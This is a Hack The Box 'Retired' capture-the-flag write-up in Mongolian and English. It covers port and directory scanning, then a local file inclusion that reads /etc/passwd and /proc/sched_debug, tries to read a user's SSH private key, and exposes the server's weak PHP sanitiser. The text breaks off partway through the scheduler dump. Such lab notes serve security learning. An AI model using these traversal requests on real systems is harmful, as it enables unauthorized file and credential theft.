<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Retired | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Retired - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-11-htb-retired-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-11-htb-retired-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - Retired"><meta property="og:description" content="HTB - Retired - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-11-htb-retired-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-11T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-11T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Retired"><meta name=twitter:description content="HTB - Retired - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Retired","item":"https://cadil.github.io/posts/2024-03-11-htb-retired-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Retired","name":"HTB - Retired","description":"HTB - Retired - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.154 # Local Address 10.10.14.121 2. Nmap \u0026 Nikto Nmap\nnmap -sV -sC -oA nmap/retired 10.10.11.154 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-10 05:47 EDT Nmap scan report for 10.10.11.154 Host is up (0.24s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA) | 256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA) |_ 256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519) 80/tcp open http nginx | http-title: Agency - Start Bootstrap Theme |_Requested resource was /index.php?page=default.html Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 54.80 seconds Nikto\nnikto -h 10.10.11.154 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.11.154 + Target Hostname: 10.10.11.154 + Target Port: 80 + Start Time: 2022-04-11 02:57:42 (GMT-4) --------------------------------------------------------------------------- + Server: nginx + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Root page / redirects to: /index.php?page=default.html + No CGI Directories found (use '-C all' to force check all possible dirs) 3. Gobuster CLI\ngobuster dir -u http://10.10.11.154 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt Result\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.154 [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/11 03:01:50 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 162] [--\u003e http://10.10.11.154/assets/] /css (Status: 301) [Size: 162] [--\u003e http://10.10.11.154/css/] /js (Status: 301) [Size: 162] [--\u003e http://10.10.11.154/js/] -x php –Ω—ç–º—ç—ç–¥ “Ø–∑–≤—ç–ª:\ngobuster dir -u http://10.10.11.154/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php 4. Feroxbuster CLI\nferoxbuster -u http://10.10.11.154 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt Result\nby Ben \"epi\" Risher ü§ì ver: 2.3.3 ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üéØ Target Url ‚îÇ http://10.10.11.154 üöÄ Threads ‚îÇ 50 üìñ Wordlist ‚îÇ /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt üëå Status Codes ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] üí• Timeout (secs) ‚îÇ 7 ü¶° User-Agent ‚îÇ feroxbuster/2.3.3 üíâ Config File ‚îÇ /etc/feroxbuster/ferox-config.toml üîÉ Recursion Depth ‚îÇ 4 üéâ New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üèÅ Press [ENTER] to use the Scan Cancel Menu‚Ñ¢ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ 301 7l 11w 162c http://10.10.11.154/js 301 7l 11w 162c http://10.10.11.154/css 301 7l 11w 162c http://10.10.11.154/assets 301 7l 11w 162c http://10.10.11.154/assets/img 301 7l 11w 162c http://10.10.11.154/assets/img/about 301 7l 11w 162c http://10.10.11.154/assets/img/logos 301 7l 11w 162c http://10.10.11.154/assets/img/team [####################] - 2m 239992/239992 0s found:7 errors:36 [####################] - 2m 29999/29999 196/s http://10.10.11.154 [####################] - 2m 29999/29999 195/s http://10.10.11.154/js [####################] - 2m 29999/29999 195/s http://10.10.11.154/css [####################] - 2m 29999/29999 195/s http://10.10.11.154/assets [####################] - 2m 29999/29999 196/s http://10.10.11.154/assets/img [####################] - 2m 29999/29999 196/s http://10.10.11.154/assets/img/about [####################] - 2m 29999/29999 195/s http://10.10.11.154/assets/img/logos [####################] - 2m 29999/29999 196/s http://10.10.11.154/assets/img/team 5. LFI Burp-—Å;\nGET /index.php?page=../../../../../../../../../../etc/passwd HTTP/1.1 Host: 10.10.11.154 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Result\nHTTP/1.1 302 Found Server: nginx Date: Mon, 11 Apr 2022 09:09:56 GMT Content-Type: text/html; charset=UTF-8 Connection: close Location: /index.php?page=default.html Content-Length: 1488 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:105::/nonexistent:/usr/sbin/nologin _chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin vagrant:x:1000:1000::/vagrant:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin dev:x:1001:1001::/home/dev:/bin/bash passwd-—Å dev —Ö—ç—Ä—ç–≥–ª—ç–≥—á /home/dev dir-–≥ —Ö–∞—Ä–∂ –±–æ–ª–∂ –±–∞–π–Ω–∞.\nGET /index.php?page=../../../../../../../../../../home/dev/.ssh/id_rsa HTTP/1.1 GET /index.php?page=../../../../../../../../../../home/dev/user.txt HTTP/1.1 –¥—ç—ç—Ä –±–∞–π–≥–∞–∞–≥ “Ø–∑—ç—Ö—ç—ç—Ä –±–æ–ª–æ–æ–≥“Ø–π.\n/prod/sched_debug index.php?page=../../../../../../../../../../prod/sched_debug index.php\n\u003c?php function sanitize_input($param) { $param1 = str_replace(\"../\",\"\",$param); $param2 = str_replace(\"./\",\"\",$param1); return $param2; } $page = $_GET['page']; if (isset($page) \u0026\u0026 preg_match(\"/^[a-z]/\", $page)) { $page = sanitize_input($page); } else { header('Location: /index.php?page=default.html'); } readfile($page); ?\u003e http://10.10.11.154/index.php?page=beta.html beta.html\n\u003cform action=\"activate_license.php\" method=\"post\" enctype=\"multipart/form-data\"\u003e \u003clabel for=\"formFile\" class=\"form-label\"\u003eUpload License Key File\u003c/label\u003e \u003cinput class=\"form-control form-control-lg\" id=\"formFile\" type=\"file\" name=\"licensefile\"/\u003e \u003cbutton type=\"submit\" class=\"btn btn-primary\"\u003eSubmit\u003c/button\u003e \u003c/form\u003e http://10.10.11.154/index.php?page=activate_license.php\nGET /index.php?page=activate_license.php HTTP/1.1 Host: 10.10.11.154 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Currently development for EMUEMU just started, but we have big plans. If you bought an OSTRICH console from us and want want to be part of the next step, you can enable your OSTRICH license for usage with EMUEMU via the activate_license application today for our upcoming beta testing program for EMUEMU. A license files contains a 512 bit key. That key is also in the QR code contained within the OSTRICH package. Thank you for participating in our beta testing program. Upload License Key File\nactivate_license.php\n\u003c?php if(isset($_FILES['licensefile'])) { $license¬†= file_get_contents($_FILES['licensefile']['tmp_name']); $license_size = $_FILES['licensefile']['size']; $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); if (!$socket) { echo \"error socket_create()\\n\"; } if (!socket_connect($socket, '127.0.0.1', 1337)) { echo \"error socket_connect()\" . socket_strerror(socket_last_error()) . \"\\n\"; } socket_write($socket, pack(\"N\", $license_size)); socket_write($socket, $license); socket_shutdown($socket); socket_close($socket); } ?\u003e GET /index.php?page=../../../../../../../../../../proc/sched_debug HTTP/1.1 Host: 10.10.11.154 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 proc/sched_debug\nHTTP/1.1 302 Found Server: nginx Date: Wed, 13 Apr 2022 03:51:40 GMT Content-Type: text/html; charset=UTF-8 Connection: close Location: /index.php?page=default.html Content-Length: 26169 Sched Debug Version: v0.11, 5.10.0-11-amd64 #1 ktime : 84680521.804596 sched_clk : 84680203.312486 cpu_clk : 84680188.015484 jiffies : 4316062397 sched_clock_stable() : 1 sysctl_sched .sysctl_sched_latency : 12.000000 .sysctl_sched_min_granularity : 1.500000 .sysctl_sched_wakeup_granularity : 2.000000 .sysctl_sched_child_runs_first : 0 .sysctl_sched_features : 16722747 .sysctl_sched_tunable_scaling : 1 (logarithmic) cpu#0, 2994.375 MHz .nr_running : 1 .nr_switches : 5155430 .nr_uninterruptible : 97 .next_balance : 4316.062369 .curr-\u003epid : 13721 .clock : 84680187.755306 .clock_task : 84680187.755306 .avg_idle : 882136 .max_idle_balance_cost : 500000 cfs_rq[0]:/ .exec_clock : 0.000000 .MIN_vruntime : 0.000001 .min_vruntime : 470279.159394 .max_vruntime : 0.000001 .spread : 0.000000 .spread0 : 0.000000 .nr_spread_over : 0 .nr_running : 1 .load : 1048576 .load_avg : 9 .runnable_avg : 9 .util_avg : 9 .util_est_enqueued : 8 .removed.load_avg : 0 .removed.util_avg : 0 .removed.runnable_avg : 0 .tg_load_avg_contrib : 0 .tg_load_avg : 0 .throttled : 0 .throttle_count : 0 rt_rq[0]: .rt_nr_running : 0 .rt_nr_migratory : 0 .rt_throttled : 0 .rt_time : 0.000000 .rt_runtime : 950.000000 dl_rq[0]: .dl_nr_running : 0 .dl_nr_migratory : 0 .dl_bw-\u003ebw : 996147 .dl_bw-\u003etotal_bw : 0 runnable tasks: S task PID tree-key switches prio wait-time sum-exec sum-sleep ------------------------------------------------------------------------------------------------------------- S systemd 1 470273.931361 26356 120 0.000000 12154.194523 0.000000 0 0 / S kthreadd 2 470118.249610 798 120 0.000000 43.232385 0.000000 0 0 / I rcu_gp 3 13.977682 2 100 0.000000 0.004629 0.000000 0 0 / I rcu_par_gp 4 15.978414 2 100 0.000000 0.002695 0.000000 0 0 / I kworker/0:0H 6 728.727785 4 100 0.000000 0.023474 0.000000 0 0 / I mm_percpu_wq 9 22.732288 2 100 0.000000 0.002565 0.000000 0 0 / S rcu_tasks_rude_ 10 24.733774 2 120 0.000000 0.002515 0.000000 0 0 / S rcu_tasks_trace 11 26.734425 2 120 0.000000 0.002135 0.000000 0 0 / S ksoftirqd/0 12 470273.303445 234438 120 0.000000 3866.137484 0.000000 0 0 / I rcu_sched 13 470278.635149 1398813 120 0.000000 17658.025786 0.000000 0 0 / S migration/0 14 0.000000 21279 0 0.000000 443.966905 0.000000 0 0 / S cpuhp/0 15 2355.724616 10 120 0.000000 0.209440 0.000000 0 0 / I netns 24 64.773608 2 100 0.000000 0.028563 0.000000 0 0 / S khungtaskd 26 470147.700559 702 120 0.000000 79.915165 0.000000 0 0 / S oom_reaper 27 74.895783 2 120 0.000000 0.000000 0.000000 0 0 / I writeback 28 80.895780 2 100 0.000000 0.000000 0.000000 0 0 / S ksmd 30 92.895774 2 125 0.000000 0.000000 0.000000 0 0 / I kintegrityd 49 374.954142 2 100 0.000000 0.000000 0.000000 0 0 / I kblockd 50 380.954139 2 100 0.000000 0.000000 0.000000 0 0 / I edac-poller 52 666.594020 2 100 0.000000 0.000000 0.000000 0 0 / I kworker/0:1H 54 470273.162678 44338 100 0.000000 1002.530760 0.000000 0 0 / S kswapd0 56 969.541102 3 120 0.000000 0.044243 0.000000 0 0 / I kthrotld 57 767.223323 2 100 0.000000 0.038923 0.000000 0 0 / S irq/24-pciehp 58 0.000000 2 49 0.000000 0.047507 0.000000 0 0 / S irq/26-pciehp 60 0.000000 2 49 0.000000 0.032440 0.000000 0 0 / S irq/28-pciehp 62 0.000000 2 49 0.000000 0.028022 0.000000 0 0 / S irq/30-pciehp 64 0.000000 2 49 0.000000 0.030929 0.000000 0 0 / S irq/32-pciehp 66 0.000000 2 49 0.000000 0.102563 0.000000 0 0 / S irq/34-pciehp 68 0.000000 2 49 0.000000 0.033433 0.000000 0 0 / S irq/36-pciehp 70 0.000000 2 49 0.000000 0.048562 0.000000 0 0 / S irq/38-pciehp 72 0.000000 2 49 0.000000 0.053139 0.000000 0 0 / S irq/40-pciehp 74 0.000000 2 49 0.000000 0.032441 0.000000 0 0 / S irq/42-pciehp 76 0.000000 2 49 0.000000 0.061664 0.000000 0 0 / S irq/44-pciehp 78 0.000000 2 49 0.000000 0.059964 0.000000 0 0 / S irq/46-pciehp 80 0.000000 2 49 0.000000 0.045345 0.000000 0 0 / S irq/48-pciehp 82 0.000000 2 49 0.000000 0.072327 0.000000 0 0 / S irq/50-pciehp 84 0.000000 2 49 0.000000 0.046387 0.000000 0 0 / S irq/52-pciehp 86 0.000000 2 49 0.000000 0.095389 0.000000 0 0 / S irq/54-pciehp 88 0.000000 2 49 0.000000 0.035466 0.000000 0 0 / I acpi_thermal_pm 90 900.787224 2 100 0.000000 0.031008 0.000000 0 0 / I ipv6_addrconf 92 905.235396 2 100 0.000000 0.018906 0.000000 0 0 / I kstrp 101 953.365437 2 100 0.000000 0.041096 0.000000 0 0 / I zswap-shrink 104 1008.899177 2 100 0.000000 0.065664 0.000000 0 0 / I kworker/u5:0 105 1012.917683 2 100 0.000000 0.022132 0.000000 0 0 / S scsi_eh_0 151 1318.113572 6 120 0.000000 82.957574 0.000000 0 0 / S scsi_eh_2 159 1559.312628 26 120 0.000000 0.523253 0.000000 0 0 / I mpt_poll_0 160 1238.381341 2 100 0.000000 0.031669 0.000000 0 0 / I mpt/0 161 1241.401738 2 100 0.000000 0.021510 0.000000 0 0 / I scsi_tmf_2 162 1318.093461 2 100 0.000000 0.012252 0.000000 0 0 / I scsi_tmf_3 164 1326.099880 2 100 0.000000 0.008556 0.000000 0 0 / I scsi_tmf_4 166 1330.103473 2 100 0.000000 0.004669 0.000000 0 0 / I scsi_tmf_5 168 1334.122953 2 100 0.000000 0.020759 0.000000 0 0 / I scsi_tmf_6 170 1338.139234 2 100 0.000000 0.017383 0.000000 0 0 / S scsi_eh_7 171 1559.297499 26 120 0.000000 0.312517 0.000000 0 0 / I scsi_tmf_7 172 1342.155522 2 100 0.000000 0.017142 0.000000 0 0 / I scsi_tmf_8 174 1346.169972 2 100 0.000000 0.015570 0.000000 0 0 / S scsi_eh_9 175 1559.343885 26 120 0.000000 0.355466 0.000000 0 0 / I scsi_tmf_9 176 1350.184659 2 100 0.000000 0.015699 0.000000 0 0 / S scsi_eh_10 177 1559.415509 26 120 0.000000 0.414236 0.000000 0 0 / I scsi_tmf_10 178 1354.200381 2 100 0.000000 0.016962 0.000000 0 0 / I scsi_tmf_11 180 1358.214386 2 100 0.000000 0.014997 0.000000 0 0 / I scsi_tmf_12 182 1362.229003 2 100 0.000000 0.015599 0.000000 0 0 / I scsi_tmf_13 184 1366.243037 2 100 0.000000 0.014927 0.000000 0 0 / I scsi_tmf_14 186 1370.257565 2 100 0.000000 0.015620 0.000000 0 0 / S scsi_eh_15 187 1559.283563 26 120 0.000000 0.350127 0.000000 0 0 / I scsi_tmf_15 188 1374.272092 2 100 0.000000 0.015519 0.000000 0 0 / S scsi_eh_16 189 1559.244359 26 120 0.000000 0.308008 0.000000 0 0 / I scsi_tmf_16 190 1378.286038 2 100 0.000000 0.014948 0.000000 0 0 / S scsi_eh_17 191 1559.243517 26 120 0.000000 0.313205 0.000000 0 0 / I scsi_tmf_17 192 1382.416404 2 100 0.000000 0.131477 0.000000 0 0 / S scsi_eh_18 193 1559.257142 26 120 0.000000 0.333966 0.000000 0 0 / I scsi_tmf_18 194 1386.432996 2 100 0.000000 0.017623 0.000000 0 0 / I scsi_tmf_19 196 1390.448174 2 100 0.000000 0.016121 0.000000 0 0 / S scsi_eh_20 197 1559.334488 26 120 0.000000 0.404589 0.000000 0 0 / I scsi_tmf_20 198 1394.464114 2 100 0.000000 0.016892 0.000000 0 0 / I scsi_tmf_21 200 1398.478440 2 100 0.000000 0.015298 0.000000 0 0 / I scsi_tmf_22 202 1402.493539 2 100 0.000000 0.016130 0.000000 0 0 / S scsi_eh_23 203 1559.348615 26 120 0.000000 0.312147 0.000000 0 0 / I scsi_tmf_23 204 1406.505911 2 100 0.000000 0.013285 0.000000 0 0 / I scsi_tmf_24 206 1410.517302 2 100 0.000000 0.012373 0.000000 0 0 / S scsi_eh_25 207 1559.343972 26 120 0.000000 0.309217 0.000000 0 0 / I scsi_tmf_25 208 1414.534994 2 100 0.000000 0.018595 0.000000 0 0 / S scsi_eh_26 209 1559.163536 26 120 0.000000 0.262300 0.000000 0 0 / I scsi_tmf_26 210 1418.549100 2 100 0.000000 0.014989 0.000000 0 0 / S scsi_eh_27 211 1559.186772 26 120 0.000000 0.282339 0.000000 0 0 / I scsi_tmf_27 212 1422.563427 2 100 0.000000 0.015249 0.000000 0 0 / I scsi_tmf_28 214 1426.577082 2 100 0.000000 0.014637 0.000000 0 0 / S scsi_eh_29 215 1559.162677 26 120 0.000000 0.259530 0.000000 0 0 / I scsi_tmf_29 216 1430.590988 2 100 0.000000 0.014778 0.000000 0 0 / S scsi_eh_30 217 1559.178394 26 120 0.000000 0.274322 0.000000 0 0 / I scsi_tmf_30 218 1434.605655 2 100 0.000000 0.015600 0.000000 0 0 / S scsi_eh_31 219 1559.163257 26 120 0.000000 0.259427 0.000000 0 0 / S scsi_eh_32 249 1561.040280 2 120 0.000000 0.035516 0.000000 0 0 / I scsi_tmf_32 250 1565.065283 2 100 0.000000 0.027331 0.000000 0 0 / I ext4-rsv-conver 282 1755.018274 3 100 0.000000 0.019756 0.000000 0 0 / S systemd-udevd 348 470187.031091 1458 120 0.000000 283.819041 0.000000 0 0 / S gmain 571 11352.409969 146 120 0.000000 1.806799 0.000000 0 0 / S activate_licens 418 446273.871782 30 120 0.000000 9.136912 0.000000 0 0 / S cron 420 470273.288456 2919 120 0.000000 762.280155 0.000000 0 0 / S dbus-daemon 421 470273.611542 18280 120 0.000000 4401.913468 0.000000 0 0 / S systemd-logind 435 470273.458224 18341 120 0.000000 2257.399290 0.000000 0 0 / S hwmon1 476 5018.456000 2 120 0.000000 0.022742 0.000000 0 0 / S php-fpm7.4 534 470274.643375 93194 120 0.000000 5149.097210 0.000000 0 0 / S agetty 537 10135.820186 8 120 0.000000 4.053591 0.000000 0 0 / S sshd 542 457594.772813 369 120 0.000000 108.212769 0.000000 0 0 / S nginx 544 470273.613225 1265337 120 0.000000 256203.405254 0.000000 0 0 / S chronyd 546 464357.367909 129 120 0.000000 14.518773 0.000000 0 0 / S chronyd 547 464357.346779 188 120 0.000000 28.587065 0.000000 0 0 / S php-fpm7.4 13565 469573.518637 70318 120 0.000000 11646.371496 0.000000 0 0 / S php-fpm7.4 13704 470163.882496 52668 120 0.000000 11328.008245 0.000000 0 0 / \u003eR php-fpm7.4 13721 470273.193438 52166 120 0.000000 9299.603609 0.000000 0 0 / I kworker/0:1 32426 470274.666697 24804 120 0.000000 717.247851 0.000000 0 0 / I kworker/u4:0 35199 470273.543113 1039 120 0.000000 55.980461 0.000000 0 0 / I kworker/u4:2 35526 470124.294341 416 120 0.000000 23.683800 0.000000 0 0 / I kworker/0:2 35926 469600.704800 9 120 0.000000 0.115347 0.000000 0 0 / I kworker/u4:1 36028 470274.534095 87 120 0.000000 4.921252 0.000000 0 0 / cpu#1, 2994.375 MHz .nr_running : 0 .nr_switches : 11377902 .nr_uninterruptible : -97 .next_balance : 4316.062370 .curr-\u003epid : 0 .clock : 84680183.209272 .clock_task : 84680183.209272 .avg_idle : 1000000 .max_idle_balance_cost : 500000 cfs_rq[1]:/ .exec_clock : 0.000000 .MIN_vruntime : 0.000001 .min_vruntime : 468595.964356 .max_vruntime : 0.000001 .spread : 0.000000 .spread0 : -1683.195038 .nr_spread_over : 0 .nr_running : 0 .load : 0 .load_avg : 0 .runnable_avg : 0 .util_avg : 0 .util_est_enqueued : 0 .removed.load_avg : 0 .removed.util_avg : 0 .removed.runnable_avg : 0 .tg_load_avg_contrib : 0 .tg_load_avg : 0 .throttled : 0 .throttle_count : 0 rt_rq[1]: .rt_nr_running : 0 .rt_nr_migratory : 0 .rt_throttled : 0 .rt_time : 0.069640 .rt_runtime : 950.000000 dl_rq[1]: .dl_nr_running : 0 .dl_nr_migratory : 0 .dl_bw-\u003ebw : 996147 .dl_bw-\u003etotal_bw : 0 runnable tasks: S task PID tree-key switches prio wait-time sum-exec sum-sleep ------------------------------------------------------------------------------------------------------------- S cpuhp/1 16 1925.910783 10 120 0.000000 0.125863 0.000000 0 0 / S migration/1 17 0.000000 21244 0 0.000000 478.944269 0.000000 0 0 / S ksoftirqd/1 18 468578.705180 234364 120 0.000000 3687.323637 0.000000 0 0 / I kworker/1:0H 20 817.144023 5 100 0.000000 0.031758 0.000000 0 0 / S kdevtmpfs 23 3672.685848 128 120 0.000000 0.895750 0.000000 0 0 / S kauditd 25 1773.778542 7 120 0.000000 1.538124 0.000000 0 0 / S kcompactd0 29 468589.493121 165392 120 0.000000 2888.144105 0.000000 0 0 / S khugepaged 31 468588.783514 14660 139 0.000000 1965.951916 0.000000 0 0 / I blkcg_punt_bio 51 30.719385 2 100 0.000000 0.006112 0.000000 0 0 / I devfreq_wq 53 36.721191 2 100 0.000000 0.003166 0.000000 0 0 / S irq/25-pciehp 59 0.000000 3 49 0.000000 0.059041 0.000000 0 0 / S irq/27-pciehp 61 0.000000 3 49 0.000000 0.059552 0.000000 0 0 / S irq/29-pciehp 63 0.000000 3 49 0.000000 0.060093 0.000000 0 0 / S irq/31-pciehp 65 0.000000 3 49 0.000000 0.139933 0.000000 0 0 / S irq/33-pciehp 67 0.000000 3 49 0.000000 0.073699 0.000000 0 0 / S irq/35-pciehp 69 0.000000 3 49 0.000000 0.068078 0.000000 0 0 / S irq/37-pciehp 71 0.000000 3 49 0.000000 0.080543 0.000000 0 0 / S irq/39-pciehp 73 0.000000 3 49 0.000000 0.118641 0.000000 0 0 / S irq/41-pciehp 75 0.000000 3 49 0.000000 0.083087 0.000000 0 0 / S irq/43-pciehp 77 0.000000 3 49 0.000000 0.072787 0.000000 0 0 / S irq/45-pciehp 79 0.000000 3 49 0.000000 0.153119 0.000000 0 0 / S irq/47-pciehp 81 0.000000 3 49 0.000000 0.063015 0.000000 0 0 / S irq/49-pciehp 83 0.000000 3 49 0.000000 0.060424 0.000000 0 0 / S irq/51-pciehp 85 0.000000 3 49 0.000000 0.074419 0.000000 0 0 / S irq/53-pciehp 87 0.000000 3 49 0.000000 0.084679 0.000000 0 0 / S irq/55-pciehp 89 0.000000 3 49 0.000000 0.074229 0.000000 0 0 / I kworker/1:1H 91 468587.284735 19166 100 0.000000 429.652332 0.000000 0 0 / I ata_sff 150 1064.213540 2 100 0.000000 0.004478 0.000000 0 0 / I scsi_tmf_0 152 1071.218263 2 100 0.000000 0.006162 0.000000 0 0 / S scsi_eh_1 153 1112.506859 4 120 0.000000 11.165957 0.000000 0 0 / I scsi_tmf_1 154 1079.223485 2 100 0.000000 0.008987 0.000000 0 0 / S scsi_eh_3 163 1354.203716 26 120 0.000000 0.318601 0.000000 0 0 / S 